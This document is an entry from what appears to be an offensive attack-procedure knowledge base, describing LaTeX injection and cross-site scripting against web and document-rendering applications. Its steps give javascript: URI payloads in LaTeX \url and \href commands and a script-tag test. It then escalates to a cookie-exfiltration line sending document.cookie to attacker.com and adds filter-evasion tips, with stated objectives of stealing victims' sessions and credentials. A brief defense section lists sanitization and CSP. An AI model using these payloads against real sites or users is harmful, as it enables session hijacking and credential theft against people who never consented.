---
id: c80e21f3-74fd-4b25-b777-b84fb1406fe5
name: LaTeX-Injection-and-Cross-Site-Scripting
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.823744+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
sub_techniques: []
tags:
  - xss
  - latex-injection
  - web-injection
commands: []
platforms:
  - Web
tools: []
validated: true
---

# LaTeX-Injection-and-Cross-Site-Scripting

## Summary

This procedure demonstrates how to perform LaTeX injection and Cross-Site Scripting (XSS) attacks to execute malicious JavaScript code in vulnerable web or document rendering contexts. LaTeX injection targets LaTeX document processors to embed executable JavaScript, while XSS injects scripts into web pages viewed by users, potentially leading to session hijacking, data theft, or further exploitation.

## Description

LaTeX injection exploits vulnerabilities in applications that render LaTeX documents, such as academic publishing platforms or collaborative editors, by embedding JavaScript URIs in LaTeX commands like \url or \href. When the document is processed and viewed in a browser-enabled viewer, the JavaScript executes in the client's context. Cross-Site Scripting (XSS) involves injecting malicious scripts into web pages via input fields, URLs, or forms, which execute when other users load the page. Both techniques can steal cookies, keystrokes, or redirect users, often in web environments lacking proper input sanitization. This procedure assumes access to a vulnerable input point and focuses on reflected or stored variants for demonstration.

## Requirements

1. Access to a vulnerable LaTeX rendering application or web page with unsanitized inputs (e.g., via user-submitted content).
2. Knowledge of basic LaTeX syntax and JavaScript for payload construction.
3. A target user or system that will process and view the injected content in a browser context.
4. Tools like a text editor for crafting payloads and a browser for testing execution.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to strip or escape LaTeX commands and JavaScript URIs in user inputs.
- Use Content Security Policy (CSP) headers to block inline scripts and javascript: URIs on web pages.
- Employ Web Application Firewalls (WAFs) to detect and block common injection patterns like 'javascript:alert'.
- Regularly update LaTeX processors and web frameworks to patch known vulnerabilities.
- Monitor for anomalous JavaScript execution via client-side logging or server-side anomaly detection.

## Objectives

1. Inject malicious JavaScript into a LaTeX document to execute on the target's machine.
2. Inject malicious scripts into a web page to execute when viewed by users.
3. Steal sensitive information such as session cookies or credentials.
4. Achieve code execution in the victim's browser context for further attacks.

## Instructions

### Step 1: Identify Vulnerable Input Points

**Context**: Locate areas where user input is processed as LaTeX or reflected/stored in web outputs without sanitization, such as comment fields in forums or document upload forms.

Search for LaTeX-enabled sites (e.g., Overleaf clones) or web apps with query parameters/forms. Test by submitting benign LaTeX like '\textbf{test}' and observing if it's rendered.

> If the input is escaped or blocked, this endpoint is not vulnerable; move to another.

### Step 2: Craft and Inject LaTeX Payload

**Context**: Use LaTeX commands to embed a JavaScript URI that executes an alert (proof-of-concept) or more malicious code when rendered.

Embed the payload using the [[codes/LaTeX-JavaScript-Alert-Payload]] code snippet in a vulnerable LaTeX input field.

**Code** ([[codes/LaTeX-JavaScript-Alert-Payload]]):

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

> Submit the document or content containing this payload. When the target views the rendered LaTeX in a browser (e.g., via PDF.js or similar), the javascript: URI triggers execution. Expected output: An alert box pops up on the victim's machine, confirming code execution. For real attacks, replace 'alert(1)' with code to exfiltrate document.cookie to an attacker-controlled server.

### Step 3: Test XSS Injection

**Context**: Identify reflected or stored XSS opportunities in web parameters or forms, then inject a JavaScript payload.

Submit a test payload like '<script>alert(1)</script>' or 'javascript:alert(1)' in a URL parameter or form field (e.g., ?search=<script>alert(1)</script>). For stored XSS, post in a comment and view the page as another user.

> If the script executes (alert appears), the site is vulnerable. Expected output: JavaScript runs in the browser, displaying an alert or performing actions like keylogging. Use browser developer tools to confirm execution in the DOM.

### Step 4: Verify and Escalate

**Context**: Confirm execution and extend the payload for data theft or persistence.

After successful injection, modify the payload to capture data, e.g., 'javascript:fetch("http://attacker.com?cookie="+document.cookie)'. Monitor your server for incoming data.

> Success is indicated by received exfiltrated data or observed actions on the target. If blocked, try encoding (e.g., URL-encode the payload) or alternative vectors like event handlers (onerror=alert(1)).
